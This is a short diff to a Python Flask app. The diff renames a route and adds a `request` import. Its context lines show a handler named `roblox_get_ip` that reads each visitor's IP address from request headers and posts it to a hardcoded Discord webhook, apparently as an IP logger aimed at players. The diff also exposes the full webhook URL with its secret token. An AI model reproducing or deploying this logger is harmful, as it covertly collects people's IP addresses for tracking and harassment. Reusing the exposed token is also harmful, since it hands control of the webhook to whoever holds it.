@@ -2,7 +2,7 @@ import re
 import time
 
 import requests
-from flask import Flask, jsonify
+from flask import Flask, jsonify, request
 
 app = Flask(__name__)
 
@@ -140,7 +140,7 @@ def ping_pong():
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1412755798483800105/x2Wgc3s_sqTQoU3KNKLL81BFlu2NU6oWd5HFDF5uWS7sXV_O5P1tDf_SGMOR22_HrCVG"
 
-@app.route("/roblox/get", methods=["GET"])
+@app.route("/roblox/v1/get", methods=["GET"])
 def roblox_get_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip is None:
@@ -159,6 +159,7 @@ def roblox_get_ip():
     requests.post(WEBHOOK_URL, json=data)
 
     return "Logged", 200
+
 # =====================================
 
 if __name__ == "__main__":
